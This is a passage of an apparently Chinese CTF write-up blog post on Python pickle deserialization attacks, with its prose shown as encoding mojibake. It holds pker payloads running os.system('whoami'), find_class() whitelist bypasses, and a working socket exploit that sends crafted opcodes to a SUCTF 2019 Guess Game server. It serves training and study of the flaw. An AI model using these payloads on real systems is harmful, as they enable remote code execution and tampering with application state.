&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å‡½æ•°æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;R&amp;#39;è°ƒç”¨ __reducce__æ–¹æ³•&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;i&amp;#39;è°ƒç”¨&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;c&amp;#39;å’Œb&amp;#39;o&amp;#39;è°ƒç”¨&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># å¤šå‚æ•°è°ƒç”¨å‡½æ•°&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å®ä¾‹åŒ–å¯¹è±¡ï¼ˆç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>å…ˆå¯¹é¢˜ç›®æœ‰å¤§æ¦‚æ€è·¯ï¼Œç„¶åè¾…ä»¥å·¥å…·~å¥½è€¶&lt;/p>
&lt;h3 id="å·¥å…·äºŒè¿---uanapickleuhttpsgithubcomsensepostanapickle">å·¥å…·äºŒè¿ - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>å…¶å®ä¸€ä¸ªå¹´é¾„å¾ˆå¤§çš„è„šæœ¬äº†ï¼Œæ”¯æŒpython2.3ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯åŒ…å«äº†å¾ˆå¤špayloadï¼Œå¯ä»¥çµæ´»è¿ç”¨~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="å¯¹ç±»å‹çš„æ£€æŸ¥">å¯¹ç±»å‹çš„æ£€æŸ¥&lt;/h3>
&lt;p>å¯ä»¥åœ¨å·²ç»æ„é€ å¥½çš„opcodeåé¢å»æ‰&lt;code>.&lt;/code>å†ç»­ä¸Šç›¸åº”çš„å¯¹è±¡çš„opcodeï¼Œä½œä¸ºæ ˆé¡¶çš„å€¼ä¾›æ£€æŸ¥&lt;/p>
&lt;h3 id="é™åˆ¶bcå¯¹æ¨¡å—çš„å¼•å…¥---find_classçš„é‡å†™">é™åˆ¶&lt;code>b'c'&lt;/code>å¯¹æ¨¡å—çš„å¼•å…¥ - &lt;code>find_class()&lt;/code>çš„é‡å†™&lt;/h3>
&lt;p>ä¿®æ”¹&lt;code>find_class()&lt;/code>ä¼šå¼•å…¥å‡½æ•°&amp;amp;æ¨¡å—çš„ç™½åå•ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³pickleçš„å®‰å…¨æ€§é—®é¢˜ï¼›ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨&lt;code>find_class()&lt;/code>çš„æ£€æŸ¥ï¼š&lt;/p>
&lt;ul>
&lt;li>opcodeè§’åº¦ï¼šå‡ºç°&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>ä¼šè°ƒç”¨&lt;/li>
&lt;li>pythonè§’åº¦ï¼šfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œåªè¦ç»•è¿‡opcodeçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼ˆæ¯”å¦‚é€šè¿‡&lt;code>__import__&lt;/code>æ¥ç»•è¿‡ï¼‰&lt;/li>
&lt;/ul>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥__main__å¼€å¤´çš„æ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>__main__&lt;/code>å¼€å¤´çš„æ¨¡å—&lt;/h3>
&lt;p>â€œé€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡å¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¹Ÿä¼šä¿®æ”¹åŸå˜é‡â€ï¼ŒåŸºäºè¿™ä¸€åŸç†ï¼Œå½“&lt;code>c&lt;/code>æŒ‡ä»¤åªå…è®¸&lt;code>__main__&lt;/code>æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥&lt;code>__main__.blue&lt;/code>ï¼ˆblueè§é¢˜è¡Œäº‹ ä¸Šä¸‹æ–‡ä¸­ä¼šæå‰å¼•å…¥ï¼‰è¿™ä¸ªmoduleï¼Œå†å°†ä¸€ä¸ªdictå‹å…¥æ ˆï¼Œå†…å®¹æ˜¯&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>ï¼›ä¹‹åæ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œå°†ä¼šæ”¹å†™&lt;code>__main__.blue.name&lt;/code>å’Œ &lt;code>__main__.blue.grade&lt;/code>ï¼Œæ­¤æ—¶å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„å˜é‡è¦†ç›–ã€‚ä¹‹åå¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨ä¸ºç©ºæ ˆï¼Œæ‹¼æ¥ä¸Šæ­£å¸¸çš„Studentå¯¹è±¡åºåˆ—åŒ–åçš„opcodeã€‚æ­¤æ—¶çš„å®Œæ•´opcodeåœ¨è¢«ååºåˆ—åŒ–æ—¶ï¼Œæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œè€Œè¢«æ‰§è¡Œæ—¶å´ä¼šå…ˆæ‰§è¡Œä¸€éå‰é¢çš„è¿‡ç¨‹ï¼Œé€ æˆå˜é‡è¦†ç›–ã€‚&lt;/p>
&lt;p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥åšåˆ°é‡å†™å˜é‡çš„å€¼ï¼Œé‚£ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå€¼æ”¹ä¸ºread wrapperçš„è¿”å›å€¼åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆè¯¦è§åé¢çš„å†…å®¹ï¼‰&lt;/p>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—æ¨¡å—åä¸èƒ½æœ‰__ç¬¦">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—&amp;amp;æ¨¡å—åä¸èƒ½æœ‰&lt;code>__&lt;/code>ç¬¦&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œæ— è§£ï¼Œdockeråœ°å€-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>æ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼Œäº¤äº’é€»è¾‘åœ¨init.py, Game.pyå’ŒTicket.pyä¸­ï¼Œ10ä»¥å†…çš„æ•°å­—éœ€è¦çŒœå¯¹10æ¬¡ï¼ˆå…¨èƒœï¼‰æ‰ä¼šè¿”å›flag&lt;/p>
&lt;p>ç„¶åæ˜¯game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>æ¥æ”¶æ•°å­—çš„è¾“å…¥ä½œä¸ºå‚æ•°ç”ŸæˆTicketå¯¹è±¡ï¼Œåºåˆ—åŒ–åå‘é€åˆ°serverç«¯&lt;/p>
&lt;p>å†çœ‹game_server.pyï¼Œç”¨äº†é‡å†™äº†çš„&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>è¿™ä¸ªé™åˆ¶çš„æ„æ€æ˜¯å¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥guess_nameå¼€å¤´å¹¶ä¸”åå­—é‡Œæ²¡æœ‰&lt;code>__&lt;/code>&lt;/p>
&lt;p>å¤§æ¦‚çœ‹å®Œäº†æµç¨‹ï¼Œæ¥ä¸‹æ¥æ‰¾æ‰¾çªç ´å£â€”â€”åºåˆ—åŒ–æ—¶æ˜¯ç”Ÿæˆä¸€ä¸ªTicketçš„å®ä¾‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>åˆ¤æ–­è¾“èµ¢åˆ™æ˜¯éœ€è¦Gameè¾…åŠ©&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>ç»“åˆgame_server.pyçš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‹¿åˆ°flagéœ€è¦&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>é‚£ä¹ˆæ„é€ çš„æ–¹å‘æœ‰äº†â€”â€”ä¿®æ”¹ç›¸å…³å‚æ•°åšåˆ°å˜é‡è¦†ç›–ï¼Œå†ä»¥åºåˆ—åŒ–çš„opcodeå½¢å¼ä¼ è¿‡å»ã€‚æ‰‹å†™opcodeé¢ä¸´çš„é—®é¢˜å°±æ˜¯é‡å†™&lt;code>find_class()&lt;/code>åå¯¹åŠ è½½æŒ‡å®šæ¨¡å—çš„é™åˆ¶ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&lt;code>__init__.py&lt;/code>ä¸­&lt;code>game = Game()&lt;/code>ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥é€šè¿‡&lt;code>guess_game.game&lt;/code>å¼•å…¥&lt;code>Game()&lt;/code>ç±»ï¼Œç„¶åä¿®æ”¹ç±»ä¸­çš„win_countå’Œround_countå°±èƒ½åšåˆ°å˜é‡è¦†ç›–ï¼›ç¬¬äºŒè¦æ³¨æ„å¿…é¡»æ‰‹å†™opcodeï¼Œå¦‚æœæ˜¯å…ˆ&lt;code>from guess_name import game&lt;/code>ï¼Œç„¶åä¿®æ”¹å‚æ•°åå†dumpï¼Œåˆ™æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ªGameå¯¹è±¡ï¼Œå°±ä¸æ˜¯ä»guess_gameè¿™ä¸ªmoduleä¸­è·å–ï¼Œç ´åä¸Šä¸‹æ–‡ï¼›ç¬¬ä¸‰è¦æ³¨æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickleåºåˆ—åŒ–æµæ‰§è¡Œå®Œä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œæ‰€ä»¥æ ˆé¡¶éœ€è¦è®¾ä¸ºTicketï¼Œè¿™é‡Œå¯ä»¥dumpsä¸€ä¸ªTicketï¼Œç„¶åæ‹¼åˆ°ä¹‹å‰æ‰‹å†™çš„opcodeä¹‹å&lt;/p>
&lt;p>opcodes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># ä¿®æ”¹win_count = 10å’Œround_count = 9ï¼Œä¼ è¿‡å»ä¹‹åæ‰§è¡Œä¸€æ¬¡round_count += 1å°±èƒ½å…¨èƒœ&lt;/span>
&lt;span style="color:#111">cguess_name&lt;/span>
&lt;span style="color:#111">game&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I10&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I9&lt;/span>
&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75715e"># cä¹‹åæ˜¯è¢«find_class()ç›‘æ§çš„åŒºåŸŸï¼Œæ‹¼æ¥Ticket&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;span style="color:#d88200">game
&lt;/span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­3 - [å·…å³°æå®¢ 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>ç™»å½•é¡µé¢ ä»»æ„å¯†ç å‡å¯ç™»å…¥ï¼Œä»…æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡+ç™»å½•æ—¶è¾“å…¥çš„å¯†ç ï¼›å›¾ç‰‡çš„urlä¸º/images?image=2.jpgï¼Œä½†æ˜¯ä¸èƒ½å¸¸è§„çš„ç›®å½•ç©¿è¶Šæ‹¿æºç ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±ä¸ä¼šäº†ï¼Œä¸‹é¢æ˜¯å¤ç°&lt;/p>
&lt;p>/imageså¯ä»¥çœ‹åˆ°å¼€ç€çš„debugç•Œé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
